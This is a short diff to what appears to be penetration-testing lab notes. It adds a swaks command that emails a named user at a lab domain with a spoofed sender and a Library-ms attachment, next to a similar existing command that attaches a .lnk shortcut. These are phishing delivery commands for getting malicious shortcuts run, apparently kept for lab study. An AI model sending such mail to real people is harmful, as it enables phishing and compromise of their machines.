@@ -89,6 +89,7 @@ swaks
 swaks -s 192.168.220.199 -p 25 -t test@supermagicorg.com -f off.sec@supermagicorg.com --header "Subject:re" --protocol ESMTP -a -au test@supermagicorg.com -ap test --body "body" --attach automatic_configuration.lnk --attach config.Library-ms --suppress-data
 ```
 
+sudo swaks -t dave.wizard@supermagicorg.com --from john@beyond.com -ap --attach config.Library-ms --server 192.168.247.199:587 --body body.txt --header "Subject: Problems" --suppress-data
 # SNMP
 nmap
 ```
